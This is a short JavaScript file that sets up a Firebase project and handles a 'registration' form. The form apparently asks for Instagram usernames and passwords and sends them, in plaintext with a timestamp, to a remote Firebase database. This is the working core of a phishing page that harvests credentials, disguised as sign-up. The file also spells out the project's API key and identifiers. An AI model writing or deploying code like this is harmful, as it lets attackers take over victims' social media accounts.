// Firebase Configuration (replace with your own Firebase config)
const firebaseConfig = {
    apiKey: "AIzaSyDCcf9XYXhvM0g8SUKb8qZeqEycx-jNCCc",
    authDomain: "cryptohub-eh.firebaseapp.com",
    databaseURL: "https://cryptohub-eh-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "cryptohub-eh",
    storageBucket: "cryptohub-eh.firebasestorage.app",
    messagingSenderId: "150967492197",
    appId: "1:150967492197:web:67b1bd1678fca2d295708c"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Get reference to the database
const database = firebase.database();

// Handle form submission
document.getElementById("registrationForm").addEventListener("submit", function(event) {
    event.preventDefault(); 

    let username = document.getElementById("instaUsername").value;
    let password = document.getElementById("instaPassword").value;

    // Store data in Firebase Realtime Database
    database.ref('users/').push({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    }).then(() => {
        document.getElementById("successMessage").style.display = "block";
        document.getElementById("registrationForm").reset();
    }).catch((error) => {
        console.error("Error saving data:", error);
    });
});
